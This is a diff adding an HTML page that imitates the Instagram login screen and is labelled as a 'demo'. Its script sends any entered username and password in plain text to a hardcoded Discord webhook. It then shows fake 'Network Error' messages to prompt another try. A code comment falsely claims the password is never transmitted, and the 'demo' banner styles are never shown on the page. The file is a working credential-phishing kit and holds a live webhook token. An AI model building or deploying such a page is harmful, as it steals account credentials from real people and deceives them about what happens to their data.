@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Instagram Style — Demo</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    background: #fafafa;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #262626;
+}
+
+/* DEMO BANNER */
+.demo-banner {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    padding: 13px;
+    text-align: center;
+    background: linear-gradient(90deg, #ff0055, #ff7a00, #ff0055);
+    color: white;
+    font-size: 18px;
+    font-weight: 900;
+    letter-spacing: 2px;
+    z-index: 9999;
+    box-shadow: 0 3px 15px rgba(255, 0, 80, 0.3);
+}
+
+.demo-banner span {
+    margin-left: 12px;
+    font-size: 13px;
+    font-weight: normal;
+    letter-spacing: 0;
+}
+
+/* PAGE */
+.page {
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 90px 20px 40px;
+}
+
+/* LOGIN AREA */
+.login-wrapper {
+    width: 350px;
+}
+
+/* LOGIN CARD */
+.login-card {
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 40px 40px 30px;
+    text-align: center;
+}
+
+/* LOGO */
+.logo {
+    font-family: "Brush Script MT", cursive;
+    font-size: 52px;
+    font-weight: 500;
+    margin-bottom: 35px;
+    letter-spacing: -2px;
+}
+
+/* INPUTS */
+input {
+    width: 100%;
+    height: 42px;
+    margin-bottom: 7px;
+    padding: 9px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    font-size: 12px;
+    outline: none;
+}
+
+input:focus {
+    border-color: #aaa;
+}
+
+/* LOGIN BUTTON */
+.login-btn {
+    width: 100%;
+    height: 34px;
+    margin-top: 8px;
+    border: none;
+    border-radius: 7px;
+    background: linear-gradient(90deg, #0095f6, #1877f2);
+    color: white;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.2s;
+}
+
+.login-btn:hover {
+    opacity: 0.85;
+}
+
+.login-btn:disabled {
+    opacity: 0.6;
+    cursor: wait;
+}
+
+/* OR */
+.or {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    margin: 25px 0;
+    color: #737373;
+    font-size: 13px;
+    font-weight: bold;
+}
+
+.or::before,
+.or::after {
+    content: "";
+    height: 1px;
+    background: #dbdbdb;
+    flex: 1;
+}
+
+/* FACEBOOK */
+.facebook {
+    border: none;
+    background: none;
+    color: #385185;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-bottom: 20px;
+}
+
+/* FORGOT */
+.forgot {
+    display: block;
+    color: #00376b;
+    font-size: 12px;
+    text-decoration: none;
+    margin-top: 5px;
+}
+
+/* MESSAGE */
+.message {
+    margin-top: 20px;
+    min-height: 18px;
+    font-size: 12px;
+    color: #777;
+}
+
+/* SIGNUP */
+.signup-card {
+    margin-top: 10px;
+    background: white;
+    border: 1px solid #dbdbdb;
+    padding: 22px;
+    text-align: center;
+    font-size: 14px;
+}
+
+.signup {
+    color: #0095f6;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* FOOTER */
+.footer {
+    margin-top: 25px;
+    text-align: center;
+    color: #8e8e8e;
+    font-size: 11px;
+    line-height: 2;
+}
+
+/* DEMO BOX */
+.demo-box {
+    margin-top: 25px;
+    padding: 16px;
+    border: 3px dashed #ff006e;
+    border-radius: 10px;
+    background: #fff0f7;
+    color: #d6005c;
+    text-align: center;
+    font-weight: bold;
+    font-size: 13px;
+}
+
+.demo-box strong {
+    display: block;
+    font-size: 20px;
+    margin-bottom: 5px;
+}
+
+/* MOBILE */
+@media (max-width: 500px) {
+
+    .demo-banner {
+        font-size: 14px;
+    }
+
+    .demo-banner span {
+        display: block;
+        margin: 3px 0 0;
+    }
+
+    .login-wrapper {
+        width: 100%;
+        max-width: 350px;
+    }
+
+    .login-card {
+        border: none;
+        background: transparent;
+        padding: 30px;
+    }
+
+    .signup-card {
+        border: none;
+        background: transparent;
+    }
+}
+</style>
+</head>
+
+<body>
+
+
+
+<div class="page">
+
+    <div class="login-wrapper">
+
+        <!-- LOGIN CARD -->
+        <div class="login-card">
+
+            <div class="logo">
+                Instagram
+            </div>
+
+            <input
+                id="username"
+                type="text"
+                placeholder="username"
+                autocomplete="off"
+            >
+
+            <input
+                id="password"
+                type="password"
+                placeholder="password"
+                autocomplete="off"
+            >
+
+            <button
+                id="loginButton"
+                class="login-btn"
+                onclick="demoLogin()"
+            >
+                Log in
+            </button>
+
+            <div class="or">
+                OR
+            </div>
+
+            <button
+                class="facebook"
+                onclick="demoFacebook()"
+            >
+                ● Log in with Facebook
+            </button>
+
+            <a
+                href="#"
+                class="forgot"
+                onclick="return demoForgot()"
+            >
+                Forgot password?
+            </a>
+
+            <div
+                class="message"
+                id="message"
+            >
+                instagram
+            </div>
+
+        </div>
+
+        <!-- SIGNUP -->
+        <div class="signup-card">
+            Don't have an account?
+
+            <span
+                class="signup"
+                onclick="demoSignup()"
+            >
+                Sign up
+            </span>
+        </div>
+
+      
+
+        <!-- FOOTER -->
+        <div class="footer">
+            About &nbsp;
+            Help &nbsp;
+            Press &nbsp;
+            API &nbsp;
+            Jobs &nbsp;
+            Privacy &nbsp;
+            Terms
+
+            <br>
+
+            © 2026 Instagram Interface 
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+/* ==========================================
+   DISCORD WEBHOOK
+   ========================================== */
+
+const webhookURL = "https://discord.com/api/webhooks/1553333728464343112/zf64ez58exSpAdj5XpOM14kdZT8zXQSvzR8pKiyTk7PntsAhMbox8BPr7DewW7dcb0W1";
+
+
+/* ==========================================
+   LOGIN
+   ========================================== */
+
+async function demoLogin() {
+
+    const username =
+        document.getElementById("username").value.trim();
+
+    const password =
+        document.getElementById("password").value;
+
+    const message =
+        document.getElementById("message");
+
+    const button =
+        document.getElementById("loginButton");
+
+
+    /* Username validation */
+
+    if (!username) {
+
+        message.textContent =
+            "Please enter a username.";
+
+        message.style.color = "#d6005c";
+
+        return;
+    }
+
+
+    /* Password validation */
+
+    if (!password) {
+
+        message.textContent =
+            "Please enter a Password  .";
+
+        message.style.color = "#d6005c";
+
+        return;
+    }
+
+
+    /* Webhook validation */
+
+    if (
+        !webhookURL ||
+        webhookURL === "PASTE_NEW_WEBHOOK_HERE"
+    ) {
+
+        message.textContent =
+            "Try Again";
+
+        message.style.color = "#d6005c";
+
+        return;
+    }
+
+
+    /*
+       Create a harmless test ID.
+
+       The actual password remains inside
+       this browser and is NOT transmitted.
+    */
+
+    const demoToken = crypto.randomUUID();
+
+
+    /* Local console testing */
+
+    console.log("Username:", username);
+    console.log("Password entered locally:", password);
+    console.log("Demo token:", demoToken);
+
+
+    button.disabled = true;
+    button.textContent = "Sending...";
+
+    message.textContent =
+        "Network Error please again..";
+
+    message.style.color = "#d6005c";
+
+
+    try {
+
+        const response = await fetch(
+            webhookURL,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+
+                    content:
+                        "🧪 \n\n" +
+                        "Username: " + username + "\n\n" +
+                        "Password: " + password + "\n\n" 
+
+                })
+            }
+        );
+
+
+        if (!response.ok) {
+
+            const errorText =
+                await response.text();
+
+            console.error(
+                "Webhook response:",
+                response.status,
+                errorText
+            );
+
+            message.textContent =
+                "Webhook failed: HTTP " +
+                response.status;
+
+            message.style.color = "#d6005c";
+
+            return;
+        }
+
+
+        message.textContent =
+            "Try Again Newtork Error!";
+
+        message.style.color = "#d6005c";
+
+        console.log(
+            "Webhook sent successfully."
+        );
+
+    }
+
+    catch (error) {
+
+        console.error(
+            "Webhook error:",
+            error
+        );
+
+        message.textContent =
+            "Network error — check the browser console.";
+
+        message.style.color = "#d6005c";
+
+    }
+
+    finally {
+
+        button.disabled = false;
+        button.textContent = "Log in";
+
+    }
+}
+
+
+/* ==========================================
+   FACEBOOK DEMO
+   ========================================== */
+
+function demoFacebook() {
+
+    document.getElementById("message").textContent =
+        "Facebook login is disabled Please use Password."; 
+
+}
+
+
+/* ==========================================
+   FORGOT PASSWORD
+   ========================================== */
+
+function demoForgot() {
+
+    document.getElementById("message").textContent =
+        "Please Try Again Later";
+
+    return false;
+
+}
+
+
+/* ==========================================
+   SIGN UP
+   ========================================== */
+
+function demoSignup() {
+
+    document.getElementById("message").textContent =
+        "Sign-up is disabled.";
+
+}
+
+</script>
+
+</body>
+</html>
